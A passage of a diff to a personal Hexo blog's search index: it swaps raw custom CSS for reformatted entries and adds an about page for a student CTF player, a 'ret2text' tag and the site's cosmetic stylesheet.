-  border-right: 1px solid #f2b94b;
-}
-.bangumi-info-item span {
-  color: #f2b94b;
-}
-.bangumi-info-item em {
-  color: #f2b94b;
-}
-
-/* 解决artitalk的图标问题 */
-#uploadSource > svg {
-  width: 1.19em;
-  height: 1.5em;
-}
-
-/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */
-#page-header:not(.not-top-img):before {
-  background-color: transparent !important;
-}
-
-/* 首页文章卡片 */
-#recent-posts > .recent-post-item {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 首页侧栏卡片 */
-#aside-content .card-widget {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 文章页面正文背景 */
-div#post {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 分页页面 */
-div#page {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 归档页面 */
-div#archive {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 标签页面 */
-div#tag {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/* 分类页面 */
-div#category {
-  background: rgba(255, 255, 255, 0.9);
-}
-
-/*夜间模式伪类遮罩层透明*/
-[data-theme="dark"] #recent-posts > .recent-post-item {
-  background: #121212;
-}
-
-[data-theme="dark"] .card-widget {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#post {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#tag {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#archive {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#page {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#category {
-  background: #121212 !important;
-}
-
-[data-theme="dark"] div#category {
-  background: transparent !important;
-}
-/* 页脚透明 */
-#footer {
-  background: transparent !important;
-}
-
-/* 头图透明 */
-#page-header {
-  background: transparent !important;
-}
-
-#rightside > div > button {
-  border-radius: 5px;
-}
-
-/* 滚动条 */
-
-::-webkit-scrollbar {
-  width: 10px;
-  height: 10px;
-}
-
-::-webkit-scrollbar-thumb {
-  background-color: #3b70fc;
-  border-radius: 2em;
-}
-
-::-webkit-scrollbar-corner {
-  background-color: transparent;
-}
-
-::-moz-selection {
-  color: #fff;
-  background-color: #3b70fc;
-}
-
-/* 音乐播放器 */
-
-/* .aplayer .aplayer-lrc {
-  display: none !important;
-} */
-
-.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-  left: -66px !important;
-  transition: all 0.3s;
-  /* 默认情况下缩进左侧66px，只留一点箭头部分 */
-}
-
-.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-  left: 0 !important;
-  transition: all 0.3s;
-  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */
-}
-
-.aplayer.aplayer-fixed {
-  z-index: 999999 !important;
-}
-
-/* 评论框  */
-.vwrap {
-  box-shadow: 2px 2px 5px #bbb;
-  background: rgba(255, 255, 255, 0.3);
-  border-radius: 8px;
-  padding: 30px;
-  margin: 30px 0px 30px 0px;
-}
-
-/* 设置评论框 */
-
-.vcard {
-  box-shadow: 2px 2px 5px #bbb;
-  background: rgba(255, 255, 255, 0.3);
-  border-radius: 8px;
-  padding: 30px;
-  margin: 30px 0px 0px 0px;
-}
-
-/* md网站下划线 */
-#article-container a:hover {
-  text-decoration: none !important;
-}
-
-#article-container #hpp_talk p img {
-  display: inline;
-}
-
-/* 404页面 */
-#error-wrap {
-  position: absolute;
-  top: 40%;
-  right: 0;
-  left: 0;
-  margin: 0 auto;
-  padding: 0 1rem;
-  max-width: 1000px;
-  transform: translate(0, -50%);
-}
-
-#error-wrap .error-content {
-  display: flex;
-  flex-direction: row;
-  justify-content: center;
-  align-items: center;
-  margin: 0 1rem;
-  height: 18rem;
-  border-radius: 8px;
-  background: var(--card-bg);
-  box-shadow: var(--card-box-shadow);
-  transition: all 0.3s;
-}
-
-#error-wrap .error-content .error-img {
-  box-flex: 1;
-  flex: 1;
-  height: 100%;
-  border-top-left-radius: 8px;
-  border-bottom-left-radius: 8px;
-  background-color: #3b70fc;
-  background-position: center;
-  background-size: cover;
-}
-
-#error-wrap .error-content .error-info {
-  box-flex: 1;
-  flex: 1;
-  padding: 0.5rem;
-  text-align: center;
-  font-size: 14px;
-  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;
-}
-#error-wrap .error-content .error-info .error_title {
-  margin-top: -4rem;
-  font-size: 9em;
-}
-#error-wrap .error-content .error-info .error_subtitle {
-  margin-top: -3.5rem;
-  word-break: break-word;
-  font-size: 1.6em;
-}
-#error-wrap .error-content .error-info a {
-  display: inline-block;
-  margin-top: 0.5rem;
-  padding: 0.3rem 1.5rem;
-  background: var(--btn-bg);
-  color: var(--btn-color);
-}
-
-#body-wrap.error .aside-list {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: nowrap;
-  bottom: 0px;
-  position: absolute;
-  padding: 1rem;
-  width: 100%;
-  overflow: scroll;
-}
-
-#body-wrap.error .aside-list .aside-list-group {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: nowrap;
-  max-width: 1200px;
-  margin: 0 auto;
-}
-
-#body-wrap.error .aside-list .aside-list-item {
-  padding: 0.5rem;
-}
-
-#body-wrap.error .aside-list .aside-list-item img {
-  width: 100%;
-  object-fit: cover;
-  border-radius: 12px;
-}
-
-#body-wrap.error .aside-list .aside-list-item .thumbnail {
-  overflow: hidden;
-  width: 230px;
-  height: 143px;
-  background: var(--anzhiyu-card-bg);
-  display: flex;
-}
-
-#body-wrap.error .aside-list .aside-list-item .content .title {
-  -webkit-line-clamp: 2;
-  overflow: hidden;
-  display: -webkit-box;
-  -webkit-box-orient: vertical;
-  line-height: 1.5;
-  justify-content: center;
-  align-items: flex-end;
-  align-content: center;
-  padding-top: 0.5rem;
-  color: white;
-}
-
-#body-wrap.error .aside-list .aside-list-item .content time {
-  display: none;
-}
-
-
-/* 侧边栏个人信息卡片动态渐变色 */
-#aside-content > .card-widget.card-info {
-  background: linear-gradient(
-    -45deg,
-    #e8d8b9,
-    #eccec5,
-    #ff9d60,
-    #ff83a2,
-    #eec1ea
-  );
-  box-shadow: 0 0 5px rgb(66, 68, 68);
-  position: relative;
-  background-size: 400% 400%;
-  -webkit-animation: Gradient 10s ease infinite;
-  -moz-animation: Gradient 10s ease infinite;
-  animation: Gradient 10s ease infinite !important;
-}
-@-webkit-keyframes Gradient {
-  0% {
-    background-position: 0% 50%;
-  }
-  50% {
-    background-position: 100% 50%;
-  }
-  100% {
-    background-position: 0% 50%;
-  }
-}
-@-moz-keyframes Gradient {
-  0% {
-    background-position: 0% 50%;
-  }
-  50% {
-    background-position: 100% 50%;
-  }
-  100% {
-    background-position: 0% 50%;
-  }
-}
-@keyframes Gradient {
-  0% {
-    background-position: 0% 50%;
-  }
-  50% {
-    background-position: 100% 50%;
-  }
-  100% {
-    background-position: 0% 50%;
-  }
-}
-
-/* 侧边栏个人信息卡片动态渐变色 */
-#aside-content>.card-widget.card-info{
-    background: linear-gradient(-45deg, rgba(255, 183, 197, 0.8), 
-    rgb(234 138 138 / 80%), 
-    rgb(255 184 184 / 80%), 
-    rgba(255, 219, 111, 0.8));
-}
-[data-theme=dark] #aside-content>.card-widget.card-info {
-    background: linear-gradient(-45deg, rgba(45, 45, 45, 0.8), 
-    rgba(60, 60, 60, 0.8), 
-    rgba(75, 75, 75, 0.8), 
-    rgba(90, 90, 90, 0.8));
-}
-
-
-/*导航栏居中*/
-	#nav-right{
-    flex:1 1 auto;
-    justify-content: flex-end;
-    margin-left: auto;
-    display: flex;
-    flex-wrap:nowrap;
-}
-
-
-
-
-]]></content>
-  </entry>
-  <entry>
-    <title>分类</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> ret2text </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+    
+    
+    <entry>
+      <title></title>
+      <link href="/%E6%9C%AA%E5%91%BD%E5%90%8D.html"/>
+      <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分类</title>
+      <link href="/archive/index.html"/>
+      <url>/archive/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>标签</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>SDUST <strong>大一学生</strong><br>CTFer 主要方向为<strong>pwn</strong></p><hr><h2 id="兴趣爱好"><a href="#兴趣爱好" class="headerlink" title="兴趣爱好"></a>兴趣爱好</h2><p>足球 主队是<strong>山东泰山</strong>和<strong>曼城</strong><br>板绘 爱画一些<strong>二次元妹子</strong>，<del>但实际上是个现充</del><br>在看的书 <strong>《深入理解计算机系统（CSAPP）》</strong></p><hr><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>QQ 1935572185<br>163邮箱 <a href="mailto:&#108;&#122;&#114;&#50;&#48;&#x30;&#54;&#x31;&#x30;&#48;&#56;&#x40;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#x6d;">lzr20061008@163.com</a></p>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/css/custom.css"/>
+      <url>/css/custom.css</url>
+      
+        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 侧边栏个人信息卡片动态渐变色 */#aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #ff9d60,    #ff83a2,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}/* 侧边栏个人信息卡片动态渐变色 */#aside-content>.card-widget.card-info{    background: linear-gradient(-45deg, rgba(255, 183, 197, 0.8),     rgb(234 138 138 / 80%),     rgb(255 184 184 / 80%),     rgba(255, 219, 111, 0.8));}[data-theme=dark] #aside-content>.card-widget.card-info {    background: linear-gradient(-45deg, rgba(45, 45, 45, 0.8),     rgba(60, 60, 60, 0.8),     rgba(75, 75, 75, 0.8),     rgba(90, 90, 90, 0.8));}/*导航栏居中*/#nav-right{    flex:1 1 auto;    justify-content: flex-end;    margin-left: auto;    display: flex;    flex-wrap:nowrap;}]]></content>
+      
+    </entry>
+    
+    
+  
 </search>
